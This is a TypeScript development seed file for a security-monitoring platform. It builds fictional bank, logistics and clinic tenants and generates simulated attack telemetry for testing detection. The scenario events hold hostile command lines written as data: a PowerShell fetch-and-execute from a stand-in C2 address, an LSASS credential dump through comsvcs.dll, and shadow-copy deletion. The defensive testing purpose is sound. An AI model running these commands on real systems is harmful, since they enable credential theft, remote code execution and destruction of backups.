/**
 * DEVELOPMENT SEED — never run against production (refuses NODE_ENV=production).
 *
 * Creates the demo MSSP tenant "Dorisec Africa" with three customer organizations, staff and
 * customer users, inventory (assets incl. crown jewels and internet-facing hosts, agents in
 * mixed health, identities, vulnerabilities incl. CISA-KEV CVEs) and a threat-intel feed — then
 * pushes realistic canonical telemetry THROUGH THE REAL INGEST API. Alerts, incidents,
 * escalations, IOC matches, graph edges and risk scores are therefore produced by the engines
 * (detection → correlation → risk), not inserted here.
 *
 * Idempotent: inventory is upserted, and telemetry uses deterministic ids/timestamps anchored at
 * the first run (stored in accounts.settings.seed), so re-running ingests nothing twice.
 * `--refresh` re-anchors the scenario at "now" to produce fresh activity.
 *
 * All addresses are from documentation ranges (RFC 5737 / 1918) and domains use `.example`.
 */
import type { IngestEvent, Severity } from "@bloody/contracts";
import { uuidV5 } from "@bloody/engines";
import type { FastifyInstance } from "fastify";
import { buildApp, type BuiltApp } from "../app.js";
import { loadConfig } from "../config.js";
import { hashPassword } from "../security/passwords.js";
import { sha256Hex } from "../security/crypto.js";
import { migrate } from "./migrate.js";
import { Database, createPool } from "./pool.js";

// ─── Specs ──────────────────────────────────────────────────────────────────

type AssetKind = "endpoint" | "server" | "domain_controller" | "database" | "network_device" | "application" | "kubernetes_cluster";
type Criticality = "low" | "medium" | "high" | "crown_jewel";

interface AssetSpec {
  host: string;
  name: string;
  kind: AssetKind;
  os: string;
  ip: string[];
  criticality: Criticality;
  internetFacing?: boolean;
  tags?: string[];
  owner?: string;
  agent?: {
    platform: "windows" | "macos" | "linux";
    version: string;
    status: "protected" | "outdated" | "unresponsive" | "isolated" | "pending";
    av: "protected" | "unhealthy" | "unmanaged" | "incompatible";
    firewall: boolean;
    /** Hours since the last check-in (unresponsive agents are days old). */
    lastCheckinHoursAgo?: number;
  };
}

interface IdentitySpec {
  provider: string;
  principal: string;
  displayName: string;
  kind?: "user" | "service_account";
  privileged?: boolean;
  mfa?: boolean;
  lastActivityDaysAgo?: number;
}

interface VulnSpec {
  host: string;
  cve: string;
  title: string;
  cvss: number;
  epss: number;
  kev: boolean;
  patch: boolean;
  firstSeenDaysAgo: number;
}

interface OrgSpec {
  slug: string;
  name: string;
  industry: string;
  plan: "essentials" | "professional" | "enterprise";
  mrr: number;
  retentionDays: number;
  assets: AssetSpec[];
  identities: IdentitySpec[];
  vulns: VulnSpec[];
  reach: Array<[string, string[]]>;
  access: Array<[string, Array<{ host: string; level: "admin" | "user" | "owner" }>]>;
  scenario: (ctx: ScenarioCtx) => SeedEvent[];
  /** Common user principals for background sign-in noise. */
  users: string[];
  idp: string;
  /** Where the organization's staff normally sign in from (background noise never "travels"). */
  home: { country: string; city: string; lat: number; lon: number };
}

type SeedEvent = Omit<IngestEvent, "id" | "provenance"> & { key: string };

interface ScenarioCtx {
  /** ISO timestamp `minutes` (plus `seconds`) before the scenario anchor. */
  at(minutesBefore: number, seconds?: number): string;
}

const WIN11 = "Windows 11 Enterprise 23H2";
const WIN10 = "Windows 10 Enterprise 22H2";
const WS2022 = "Windows Server 2022 Datacenter";
const WS2019 = "Windows Server 2019 Standard";
const UBUNTU = "Ubuntu 22.04.4 LTS";
const WAZUH_CURRENT = "4.9.2";
const WAZUH_OLD = "4.3.10";

const NAIROBI = { country: "KE", city: "Nairobi", lat: -1.2921, lon: 36.8219 };
const FRANKFURT = { country: "DE", city: "Frankfurt", lat: 50.1109, lon: 8.6821 };
const DAR = { country: "TZ", city: "Dar es Salaam", lat: -6.7924, lon: 39.2083 };
const CAIRO = { country: "EG", city: "Cairo", lat: 30.0444, lon: 31.2357 };

// Threat-intel feed (tenant-wide, MSSP-curated). Documentation ranges / .example only.
const C2_IP = "198.51.100.23";
const C2_DOMAIN = "cdn-telemetry.update-check.example";
const SPRAY_IP = "203.0.113.50";
const EXPLOIT_IP = "203.0.113.200";
const LOCKER_PATH = "C:\\ProgramData\\Microsoft\\Crypto\\svchost32.exe";
const LOCKER_SHA256 = sha256Hex("bloody-dev-seed:locker-sample");

const INDICATORS = [
  { type: "ip" as const, value: C2_IP, confidence: 90, severity: "critical" as Severity, source: "misp", threatActor: "TA-AFR-07", malware: "Cobalt Strike", campaign: "Operation Baobab", tags: ["c2", "banking"] },
  { type: "domain" as const, value: C2_DOMAIN, confidence: 85, severity: "high" as Severity, source: "misp", threatActor: "TA-AFR-07", malware: "Cobalt Strike", campaign: "Operation Baobab", tags: ["c2", "dns-beacon"] },
  { type: "ip" as const, value: SPRAY_IP, confidence: 75, severity: "high" as Severity, source: "opencti", threatActor: null, malware: null, campaign: "Credential spraying wave Q3", tags: ["password-spray"] },
  { type: "ip" as const, value: EXPLOIT_IP, confidence: 70, severity: "medium" as Severity, source: "opencti", threatActor: null, malware: null, campaign: null, tags: ["scanner", "exploitation"] },
  { type: "sha256" as const, value: LOCKER_SHA256, confidence: 95, severity: "critical" as Severity, source: "misp", threatActor: "LockBit affiliate", malware: "LockBit 3.0", campaign: null, tags: ["ransomware"] },
  { type: "domain" as const, value: "login-microsoftonline-secure.example", confidence: 80, severity: "high" as Severity, source: "opencti", threatActor: "TA-AFR-07", malware: null, campaign: "Operation Baobab", tags: ["phishing"] },
];

// ─── Event builders ─────────────────────────────────────────────────────────

const endpointSource = (host: string) => ({ kind: "endpoint" as const, product: "wazuh", vendor: "Wazuh", sensorId: `wazuh-agent:${host}` });

function proc(key: string, timestamp: string, host: string, os: string, p: { path: string; cmd: string; parent?: string; user?: string; sha256?: string }, extra: Partial<SeedEvent> = {}): SeedEvent {
  const name = p.path.split("\\").pop()!;
  return {
    key,
    timestamp,
    source: endpointSource(host),
    category: "process",
    eventType: "process_start",
    action: "start",
    asset: { hostname: host, os },
    ...(p.user ? { user: { name: p.user, domain: "CORP" } } : {}),
    process: {
      name,
      path: p.path,
      commandLine: p.cmd,
      ...(p.user ? { user: p.user } : {}),
      ...(p.sha256 ? { hashSha256: p.sha256 } : {}),
      ...(p.parent ? { parent: { path: p.parent, name: p.parent.split("\\").pop()! } } : {}),
    },
    ...extra,
  };
}

function signIn(key: string, timestamp: string, idp: string, principal: string, outcome: "success" | "failure", ip: string, geo?: { country: string; city: string; lat: number; lon: number }, mfa?: boolean): SeedEvent {
  return {
    key,
    timestamp,
    source: { kind: "identity", product: idp },
    category: "authentication",
    eventType: "sign_in",
    action: "login",
    outcome,
    severity: outcome === "failure" ? "low" : "info",
    identity: { provider: idp, principal, sourceIp: ip, outcome, ...(geo ? { geo } : {}), ...(mfa !== undefined ? { mfa } : {}) },
    message: `${principal} sign-in ${outcome} from ${ip}`,
  };
}

function dns(key: string, timestamp: string, host: string, srcIp: string, query: string, sensor: string): SeedEvent {
  return {
    key,
    timestamp,
    source: { kind: "network", product: "zeek", sensorId: sensor },
    category: "dns",
    eventType: "dns_query",
    asset: { hostname: host },
    network: { srcIp, dstIp: "10.0.0.2", dstPort: 53, protocol: "udp", dnsQuery: query },
  };
}

function conn(key: string, timestamp: string, host: string, srcIp: string, dstIp: string, dstPort: number, sensor: string, bytesOut = 1200): SeedEvent {
  return {
    key,
    timestamp,
    source: { kind: "network", product: "zeek", sensorId: sensor },
    category: "network",
    eventType: "conn",
    asset: { hostname: host },
    network: { direction: dstIp.startsWith("10.") ? "lateral" : "outbound", protocol: "tcp", srcIp, srcPort: 49152 + (bytesOut % 10000), dstIp, dstPort, bytesOut, bytesIn: Math.round(bytesOut * 3.1) },
  };
}

function sca(key: string, timestamp: string, host: string, os: string, control: string, title: string, outcome: "success" | "failure"): SeedEvent {
  return {
    key,
    timestamp,
    source: endpointSource(host),
    category: "configuration",
    eventType: "sca_check",
    outcome,
    severity: outcome === "failure" ? "low" : "info",
    asset: { hostname: host, os },
    message: `${control} ${title}: ${outcome === "failure" ? "failed" : "passed"}`,
    labels: { control, benchmark: os.startsWith("Windows") ? "CIS Microsoft Windows" : "CIS Ubuntu Linux" },
  };
}

// Deterministic PRNG so the background noise is identical on every run (idempotency).
function mulberry32(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const BENIGN_DOMAINS = ["login.microsoftonline.com", "outlook.office365.com", "www.google.com", "github.com", "update.microsoft.com", "teams.microsoft.com", "slack.com", "api.mpesa.example", "cdn.jsdelivr.net", "time.windows.com"];
const BENIGN_PROCS = [
  { path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", cmd: "chrome.exe --type=renderer" },
  { path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", cmd: "OUTLOOK.EXE /recycle" },
  { path: "C:\\Windows\\System32\\svchost.exe", cmd: "svchost.exe -k netsvcs -p" },
  { path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", cmd: "EXCEL.EXE \"\\\\fs\\finance\\Q3-forecast.xlsx\"" },
  { path: "C:\\Windows\\explorer.exe", cmd: "explorer.exe" },
];

/** Seven days of ordinary telemetry: sign-ins, process starts, DNS, flows, posture checks. */
function backgroundNoise(org: OrgSpec, ctx: ScenarioCtx, sensor: string): SeedEvent[] {
  const rnd = mulberry32(parseInt(sha256Hex(org.slug).slice(0, 8), 16));
  const pick = <T>(xs: readonly T[]): T => xs[Math.floor(rnd() * xs.length)]!;
  const out: SeedEvent[] = [];
  const windows = org.assets.filter((a) => a.os.startsWith("Windows") && a.kind === "endpoint");
  const servers = org.assets.filter((a) => a.kind !== "endpoint" && a.kind !== "network_device" && a.kind !== "kubernetes_cluster");
  for (let i = 0; i < 260; i++) {
    const minutes = 240 + Math.floor(rnd() * 7 * 24 * 60); // keep clear of the attack window
    const t = ctx.at(minutes, Math.floor(rnd() * 60));
    const r = rnd();
    if (r < 0.3) {
      out.push(signIn(`noise:signin:${i}`, t, org.idp, pick(org.users), "success", `192.0.2.${10 + Math.floor(rnd() * 200)}`, org.home, true));
    } else if (r < 0.55 && windows.length > 0) {
      const host = pick(windows);
      const p = pick(BENIGN_PROCS);
      out.push(proc(`noise:proc:${i}`, t, host.host, host.os, { ...p, parent: "C:\\Windows\\explorer.exe", user: pick(org.users).split("@")[0]!.replace(".", "") }));
    } else if (r < 0.8) {
      const host = pick([...windows, ...servers]);
      out.push(dns(`noise:dns:${i}`, t, host.host, host.ip[0]!, pick(BENIGN_DOMAINS), sensor));
    } else if (r < 0.95) {
      const host = pick([...windows, ...servers]);
      const target = pick(servers);
      out.push(conn(`noise:conn:${i}`, t, host.host, host.ip[0]!, target.ip[0]!, pick([443, 445, 1433, 389, 22]), sensor, 500 + Math.floor(rnd() * 50_000)));
    } else {
      out.push(signIn(`noise:signin-fail:${i}`, t, org.idp, pick(org.users), "failure", `192.0.2.${10 + Math.floor(rnd() * 200)}`, org.home));
    }
  }
  // CIS posture checks (latest result per control and host counts toward cloud/config posture).
  const checks: Array<[string, string]> = [
    ["CIS-1.1.1", "Enforce password history"],
    ["CIS-2.3.1.1", "Disable the built-in Guest account"],
    ["CIS-9.1.1", "Windows Firewall: Domain profile enabled"],
    ["CIS-18.9.4", "Disable SMBv1"],
  ];
  for (const a of org.assets.filter((x) => x.agent)) {
    checks.forEach(([control, title], j) => {
      const failing = (a.agent!.firewall === false && control === "CIS-9.1.1") || (j === 3 && a.criticality === "low") || (a.agent!.status === "outdated" && j === 0);
      out.push(sca(`noise:sca:${a.host}:${control}`, ctx.at(30 + j), a.host, a.os, control, title, failing ? "failure" : "success"));
    });
  }
  return out;
}

// ─── Organizations ──────────────────────────────────────────────────────────

const KILIMANJARO: OrgSpec = {
  slug: "kilimanjaro-bank",
  name: "Kilimanjaro Bank",
  industry: "Financial services",
  plan: "enterprise",
  mrr: 18_500,
  retentionDays: 365,
  idp: "entra-id",
  home: DAR,
  users: ["amina.mushi@kilimanjaro-bank.example", "peter.kimaro@kilimanjaro-bank.example", "grace.lyimo@kilimanjaro-bank.example", "joseph.mrema@kilimanjaro-bank.example"],
  assets: [
    { host: "kb-dc01", name: "KB Domain Controller 01", kind: "domain_controller", os: WS2022, ip: ["10.10.0.10"], criticality: "crown_jewel", tags: ["tier0", "active-directory"], owner: "IT Infrastructure", agent: { platform: "windows", version: WAZUH_CURRENT, status: "protected", av: "protected", firewall: true } },
    { host: "kb-coredb01", name: "Core Banking Database", kind: "database", os: "Oracle Linux 8.9", ip: ["10.10.5.20"], criticality: "crown_jewel", tags: ["pci-dss", "core-banking"], owner: "Core Banking", agent: { platform: "linux", version: WAZUH_CURRENT, status: "protected", av: "unmanaged", firewall: true } },
    { host: "kb-web01", name: "Internet Banking Portal", kind: "server", os: UBUNTU, ip: ["10.10.1.15", "203.0.113.15"], criticality: "high", internetFacing: true, tags: ["dmz", "customer-facing"], owner: "Digital Channels", agent: { platform: "linux", version: WAZUH_CURRENT, status: "protected", av: "protected", firewall: true } },
    { host: "kb-vpn01", name: "Remote Access VPN Gateway", kind: "network_device", os: "FortiOS 7.2.6", ip: ["10.10.1.1", "203.0.113.1"], criticality: "high", internetFacing: true, tags: ["perimeter"], owner: "Network Ops" },
    { host: "kb-app01", name: "Loan Origination App Server", kind: "server", os: WS2019, ip: ["10.10.5.11"], criticality: "high", tags: ["pci-dss"], owner: "Lending", agent: { platform: "windows", version: WAZUH_CURRENT, status: "protected", av: "protected", firewall: false } },
    { host: "kb-ws-fin07", name: "Finance Workstation 07", kind: "endpoint", os: WIN11, ip: ["10.10.20.47"], criticality: "medium", tags: ["finance"], owner: "grace.lyimo", agent: { platform: "windows", version: WAZUH_CURRENT, status: "protected", av: "protected", firewall: true } },
    { host: "kb-ws-fin12", name: "Finance Workstation 12", kind: "endpoint", os: WIN11, ip: ["10.10.20.52"], criticality: "medium", tags: ["finance"], owner: "peter.kimaro", agent: { platform: "windows", version: WAZUH_OLD, status: "outdated", av: "unhealthy", firewall: true } },
    { host: "kb-ws-hr03", name: "HR Workstation 03", kind: "endpoint", os: WIN10, ip: ["10.10.21.13"], criticality: "low", tags: ["hr"], owner: "joseph.mrema", agent: { platform: "windows", version: WAZUH_CURRENT, status: "protected", av: "protected", firewall: true, lastCheckinHoursAgo: 76 } },
  ],
  identities: [
    { provider: "entra-id", principal: "amina.mushi@kilimanjaro-bank.example", displayName: "Amina Mushi (Domain Admin)", privileged: true, mfa: false },
    { provider: "entra-id", principal: "peter.kimaro@kilimanjaro-bank.example", displayName: "Peter Kimaro", mfa: true },
    { provider: "entra-id", principal: "grace.lyimo@kilimanjaro-bank.example", displayName: "Grace Lyimo", mfa: true },
    { provider: "entra-id", principal: "joseph.mrema@kilimanjaro-bank.example", displayName: "Joseph Mrema", mfa: true },
    { provider: "active-directory", principal: "svc-backup", displayName: "Backup service account", kind: "service_account", privileged: true, mfa: false, lastActivityDaysAgo: 120 },
    { provider: "active-directory", principal: "svc-sql", displayName: "SQL service account", kind: "service_account" },
  ],
  vulns: [
    { host: "kb-vpn01", cve: "CVE-2024-21762", title: "FortiOS SSL-VPN out-of-bounds write (pre-auth RCE)", cvss: 9.8, epss: 0.94, kev: true, patch: true, firstSeenDaysAgo: 12 },
    { host: "kb-web01", cve: "CVE-2021-44228", title: "Apache Log4j2 JNDI remote code execution (Log4Shell)", cvss: 10, epss: 0.97, kev: true, patch: true, firstSeenDaysAgo: 40 },
    { host: "kb-coredb01", cve: "CVE-2024-6387", title: "OpenSSH regreSSHion signal handler race (RCE)", cvss: 8.1, epss: 0.36, kev: false, patch: true, firstSeenDaysAgo: 20 },
    { host: "kb-ws-fin07", cve: "CVE-2023-23397", title: "Microsoft Outlook elevation of privilege (NTLM relay)", cvss: 9.8, epss: 0.9, kev: true, patch: true, firstSeenDaysAgo: 3 },
    { host: "kb-app01", cve: "CVE-2024-38063", title: "Windows TCP/IP IPv6 remote code execution", cvss: 9.8, epss: 0.05, kev: false, patch: true, firstSeenDaysAgo: 9 },
  ],
  reach: [
    ["kb-web01", ["kb-app01", "kb-coredb01"]],
    ["kb-vpn01", ["kb-ws-fin07", "kb-dc01"]],
    ["kb-app01", ["kb-coredb01"]],
    ["kb-ws-fin07", ["kb-dc01", "kb-app01"]],
  ],
  access: [
    ["entra-id:amina.mushi@kilimanjaro-bank.example", [{ host: "kb-dc01", level: "admin" }, { host: "kb-coredb01", level: "admin" }]],
    ["active-directory:svc-backup", [{ host: "kb-coredb01", level: "admin" }, { host: "kb-dc01", level: "admin" }]],
    ["entra-id:grace.lyimo@kilimanjaro-bank.example", [{ host: "kb-ws-fin07", level: "owner" }, { host: "kb-app01", level: "user" }]],
  ],
  // Phishing → encoded PowerShell → C2 → DNS beaconing → LSASS credential theft.
  scenario: (ctx) => {
    const host = "kb-ws-fin07";
    const ip = "10.10.20.47";
    const sensor = "zeek-kb-core01";
    const ev: SeedEvent[] = [
      proc("attack:office-shell", ctx.at(150), host, WIN11, {
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        cmd: `powershell -w hidden -c iwr http://${C2_IP}/inv.ps1|iex`,
        parent: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        user: "glyimo",
      }),
      proc("attack:encoded-ps", ctx.at(149), host, WIN11, {
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        cmd: "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
        parent: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        user: "glyimo",
      }),
      conn("attack:c2-conn", ctx.at(148), host, ip, C2_IP, 443, sensor, 4_812),
    ];
    for (let i = 0; i < 13; i++) ev.push(dns(`attack:beacon:${i}`, ctx.at(140 - (i * 280) / 60), host, ip, C2_DOMAIN, sensor));
    ev.push(
      proc("attack:lsass-dump", ctx.at(95), host, WIN11, {
        path: "C:\\Windows\\System32\\rundll32.exe",
        cmd: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 652 C:\\Users\\Public\\debug.bin full",
        parent: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        user: "glyimo",
      }),
      conn("attack:smb-dc", ctx.at(80), host, ip, "10.10.0.10", 445, sensor, 92_000),
    );
    return ev;
  },
};

const SAVANNAH: OrgSpec = {
  slug: "savannah-logistics",
  name: "Savannah Logistics",
  industry: "Transport & logistics",
  plan: "professional",
  mrr: 7_200,
  retentionDays: 180,
  idp: "okta",
  home: NAIROBI,
  users: ["j.mwangi@savannah-logistics.example", "a.otieno@savannah-logistics.example", "f.wanjiru@savannah-logistics.example", "d.kiprop@savannah-logistics.example"],
  assets: [
    { host: "sl-dc01", name: "SL Domain Controller", kind: "domain_controller", os: WS2022, ip: ["10.20.0.10"], criticality: "crown_jewel", tags: ["tier0"], agent: { platform: "windows", version: WAZUH_CURRENT, status: "protected", av: "protected", firewall: true } },
    { host: "sl-erp01", name: "Fleet & ERP Platform", kind: "application", os: WS2019, ip: ["10.20.5.30"], criticality: "crown_jewel", tags: ["erp"], owner: "Operations", agent: { platform: "windows", version: WAZUH_CURRENT, status: "protected", av: "protected", firewall: true } },
    { host: "sl-mail-gw", name: "Email Security Gateway", kind: "server", os: "Barracuda ESG 9.2", ip: ["10.20.1.25", "203.0.113.25"], criticality: "high", internetFacing: true, tags: ["perimeter", "email"] },
    { host: "sl-ws-ops01", name: "Operations Workstation 01", kind: "endpoint", os: WIN11, ip: ["10.20.30.11"], criticality: "medium", agent: { platform: "windows", version: WAZUH_CURRENT, status: "protected", av: "protected", firewall: true } },
    { host: "sl-ws-ops02", name: "Operations Workstation 02", kind: "endpoint", os: WIN11, ip: ["10.20.30.12"], criticality: "medium", agent: { platform: "windows", version: WAZUH_CURRENT, status: "protected", av: "protected", firewall: false } },
    { host: "sl-ws-ops03", name: "Dispatch Workstation 03", kind: "endpoint", os: WIN10, ip: ["10.20.30.13"], criticality: "medium", agent: { platform: "windows", version: WAZUH_CURRENT, status: "isolated", av: "protected", firewall: true } },
    { host: "sl-ws-ops04", name: "Dispatch Workstation 04", kind: "endpoint", os: WIN10, ip: ["10.20.30.14"], criticality: "low", agent: { platform: "windows", version: WAZUH_CURRENT, status: "pending", av: "unmanaged", firewall: false } },
    { host: "sl-k8s-prod", name: "Tracking API Kubernetes Cluster", kind: "kubernetes_cluster", os: "Kubernetes 1.29", ip: ["10.20.8.1"], criticality: "high", tags: ["k8s", "production"] },
  ],
  identities: [
    { provider: "okta", principal: "j.mwangi@savannah-logistics.example", displayName: "James Mwangi", mfa: false },
    { provider: "okta", principal: "a.otieno@savannah-logistics.example", displayName: "Alice Otieno (IT Manager)", privileged: true, mfa: true },
    { provider: "okta", principal: "it-admin@savannah-logistics.example", displayName: "IT Admin (shared)", privileged: true, mfa: false },
    { provider: "okta", principal: "f.wanjiru@savannah-logistics.example", displayName: "Faith Wanjiru", mfa: true },
    { provider: "okta", principal: "d.kiprop@savannah-logistics.example", displayName: "David Kiprop", mfa: true },
    { provider: "active-directory", principal: "svc-erp-integration", displayName: "ERP integration service", kind: "service_account", privileged: true, mfa: false },
  ],
  vulns: [
    { host: "sl-mail-gw", cve: "CVE-2023-2868", title: "Barracuda ESG remote command injection via TAR attachment", cvss: 9.8, epss: 0.96, kev: true, patch: true, firstSeenDaysAgo: 30 },
    { host: "sl-erp01", cve: "CVE-2023-44487", title: "HTTP/2 Rapid Reset denial of service", cvss: 7.5, epss: 0.82, kev: true, patch: true, firstSeenDaysAgo: 25 },
    { host: "sl-k8s-prod", cve: "CVE-2024-21626", title: "runc container breakout (Leaky Vessels)", cvss: 8.6, epss: 0.04, kev: false, patch: true, firstSeenDaysAgo: 14 },
    { host: "sl-ws-ops02", cve: "CVE-2024-38063", title: "Windows TCP/IP IPv6 remote code execution", cvss: 9.8, epss: 0.05, kev: false, patch: true, firstSeenDaysAgo: 6 },
  ],
  reach: [
    ["sl-mail-gw", ["sl-erp01", "sl-ws-ops01"]],
    ["sl-ws-ops01", ["sl-dc01", "sl-erp01"]],
  ],
  access: [
    ["okta:it-admin@savannah-logistics.example", [{ host: "sl-dc01", level: "admin" }, { host: "sl-erp01", level: "admin" }]],
    ["okta:a.otieno@savannah-logistics.example", [{ host: "sl-erp01", level: "admin" }]],
    ["active-directory:svc-erp-integration", [{ host: "sl-erp01", level: "admin" }]],
  ],
  // Password spray → brute force success → impossible travel → privileged role assignment.
  scenario: (ctx) => {
    const ev: SeedEvent[] = [];
    const sprayTargets = ["f.wanjiru", "d.kiprop", "j.mwangi", "a.otieno", "it-admin", "p.njoroge", "m.achieng", "s.kamau", "r.chebet", "t.omondi", "b.wekesa", "c.nyambura"];
    sprayTargets.forEach((u, i) => ev.push(signIn(`attack:spray:${i}`, ctx.at(200 - i * 0.7), "okta", `${u}@savannah-logistics.example`, "failure", SPRAY_IP, FRANKFURT)));
    for (let i = 0; i < 6; i++) ev.push(signIn(`attack:brute:${i}`, ctx.at(122, i * 10), "okta", "j.mwangi@savannah-logistics.example", "failure", "203.0.113.66", FRANKFURT));
    ev.push(signIn("attack:brute:success", ctx.at(121, 30), "okta", "j.mwangi@savannah-logistics.example", "success", "203.0.113.66", FRANKFURT, false));
    ev.push(signIn("attack:travel:1", ctx.at(70), "okta", "a.otieno@savannah-logistics.example", "success", "192.0.2.44", NAIROBI, true));
    ev.push(signIn("attack:travel:2", ctx.at(45), "okta", "a.otieno@savannah-logistics.example", "success", "203.0.113.9", FRANKFURT, true));
    ev.push({
      key: "attack:role-assigned",
      timestamp: ctx.at(118),
      source: { kind: "identity", product: "okta" },
      category: "identity",
      eventType: "role_assigned",
      action: "grant",
      identity: { provider: "okta", principal: "j.mwangi@savannah-logistics.example", sourceIp: "203.0.113.66" },
      labels: { role: "Super Administrator", actor: "j.mwangi@savannah-logistics.example" },
      message: "Super Administrator role assigned to j.mwangi@savannah-logistics.example",
    });
    return ev;
  },
};

const NILE: OrgSpec = {
  slug: "nile-health",
  name: "Nile Health Clinics",
  industry: "Healthcare",
  plan: "professional",
  mrr: 4_900,
  retentionDays: 90,
  idp: "entra-id",
  home: CAIRO,
  users: ["dr.hassan@nile-health.example", "it.support@nile-health.example", "n.farouk@nile-health.example"],
  assets: [
    { host: "nh-ehr-db01", name: "EHR Patient Records Database", kind: "database", os: WS2019, ip: ["10.30.5.10"], criticality: "crown_jewel", tags: ["phi", "hipaa"], owner: "Clinical Systems", agent: { platform: "windows", version: WAZUH_CURRENT, status: "protected", av: "protected", firewall: true } },
    { host: "nh-portal01", name: "Patient Portal", kind: "server", os: UBUNTU, ip: ["10.30.1.20", "203.0.113.120"], criticality: "high", internetFacing: true, tags: ["dmz", "patient-facing"], agent: { platform: "linux", version: WAZUH_CURRENT, status: "protected", av: "unhealthy", firewall: true } },
    { host: "nh-fs01", name: "Clinic File Server", kind: "server", os: WS2019, ip: ["10.30.5.40"], criticality: "high", tags: ["file-share"], agent: { platform: "windows", version: WAZUH_CURRENT, status: "protected", av: "protected", firewall: true } },
    { host: "nh-pacs01", name: "PACS Imaging Server", kind: "server", os: "Windows Server 2012 R2", ip: ["10.30.5.60"], criticality: "high", tags: ["medical-imaging", "legacy"], agent: { platform: "windows", version: WAZUH_OLD, status: "outdated", av: "incompatible", firewall: false } },
    { host: "nh-ws-recep01", name: "Reception Desk 01", kind: "endpoint", os: WIN11, ip: ["10.30.20.11"], criticality: "low", agent: { platform: "windows", version: WAZUH_CURRENT, status: "protected", av: "protected", firewall: true } },
    { host: "nh-ws-recep02", name: "Reception Desk 02", kind: "endpoint", os: WIN10, ip: ["10.30.20.12"], criticality: "low", agent: { platform: "windows", version: WAZUH_OLD, status: "outdated", av: "protected", firewall: true } },
    { host: "nh-ws-recep03", name: "Reception Desk 03", kind: "endpoint", os: WIN10, ip: ["10.30.20.13"], criticality: "low", agent: { platform: "windows", version: WAZUH_CURRENT, status: "protected", av: "unmanaged", firewall: true, lastCheckinHoursAgo: 120 } },
  ],
  identities: [
    { provider: "entra-id", principal: "dr.hassan@nile-health.example", displayName: "Dr. Omar Hassan", mfa: true },
    { provider: "entra-id", principal: "it.support@nile-health.example", displayName: "IT Support (privileged)", privileged: true, mfa: false },
    { provider: "entra-id", principal: "n.farouk@nile-health.example", displayName: "Nadia Farouk", mfa: false },
    { provider: "active-directory", principal: "svc-pacs", displayName: "PACS service account", kind: "service_account", privileged: true, mfa: false, lastActivityDaysAgo: 200 },
  ],
  vulns: [
    { host: "nh-portal01", cve: "CVE-2022-26134", title: "Atlassian Confluence OGNL injection (unauthenticated RCE)", cvss: 9.8, epss: 0.97, kev: true, patch: true, firstSeenDaysAgo: 18 },
    { host: "nh-pacs01", cve: "CVE-2019-0708", title: "Remote Desktop Services RCE (BlueKeep)", cvss: 9.8, epss: 0.97, kev: true, patch: false, firstSeenDaysAgo: 400 },
    { host: "nh-ws-recep02", cve: "CVE-2024-38063", title: "Windows TCP/IP IPv6 remote code execution", cvss: 9.8, epss: 0.05, kev: false, patch: true, firstSeenDaysAgo: 8 },
    { host: "nh-fs01", cve: "CVE-2020-1472", title: "Netlogon elevation of privilege (Zerologon)", cvss: 10, epss: 0.97, kev: true, patch: true, firstSeenDaysAgo: 60 },
  ],
  reach: [
    ["nh-portal01", ["nh-ehr-db01", "nh-fs01"]],
    ["nh-fs01", ["nh-ehr-db01", "nh-pacs01"]],
  ],
  access: [
    ["entra-id:it.support@nile-health.example", [{ host: "nh-fs01", level: "admin" }, { host: "nh-ehr-db01", level: "admin" }]],
    ["active-directory:svc-pacs", [{ host: "nh-pacs01", level: "admin" }]],
  ],
  // Exploitation of the patient portal → ransomware encryption burst on the file server.
  scenario: (ctx) => {
    const ev: SeedEvent[] = [
      {
        key: "attack:suricata-exploit",
        timestamp: ctx.at(90),
        source: { kind: "network", product: "suricata", sensorId: "suricata-nh-dmz" },
        category: "detection",
        eventType: "ids_alert",
        severity: "critical",
        asset: { hostname: "nh-portal01" },
        network: { direction: "inbound", srcIp: EXPLOIT_IP, srcPort: 51515, dstIp: "10.30.1.20", dstPort: 443, protocol: "tcp" },
        detection: { ruleId: "2036984", ruleName: "ET EXPLOIT Atlassian Confluence OGNL Injection (CVE-2022-26134)", engine: "suricata" },
        attack: [{ id: "T1190", name: "Exploit Public-Facing Application", tactic: "initial-access" }],
      },
      proc("attack:vss-delete", ctx.at(47), "nh-fs01", WS2019, { path: "C:\\Windows\\System32\\vssadmin.exe", cmd: "vssadmin.exe delete shadows /all /quiet", parent: LOCKER_PATH, user: "SYSTEM" }),
      proc("attack:locker-start", ctx.at(46), "nh-fs01", WS2019, { path: LOCKER_PATH, cmd: `${LOCKER_PATH} -path \\\\nh-fs01\\clinic -pass ********`, parent: "C:\\Windows\\System32\\services.exe", user: "SYSTEM", sha256: LOCKER_SHA256 }),
    ];
    for (let i = 0; i < 60; i++) {
      ev.push({
        key: `attack:rename:${i}`,
        timestamp: ctx.at(45, i * 0.5),
        source: endpointSource("nh-fs01"),
        category: "file",
        eventType: "file_rename",
        action: "rename",
        asset: { hostname: "nh-fs01", os: WS2019 },
        process: { name: "svchost32.exe", path: LOCKER_PATH },
        file: { path: `D:\\Clinic\\Records\\patient-${1000 + i}.pdf.lockbit`, name: `patient-${1000 + i}.pdf.lockbit`, action: "rename" },
      });
    }
    ev.push(conn("attack:portal-to-db", ctx.at(60), "nh-portal01", "10.30.1.20", "10.30.5.10", 1433, "zeek-nh-core", 250_000));
    return ev;
  },
};

const ORGS: OrgSpec[] = [KILIMANJARO, SAVANNAH, NILE];
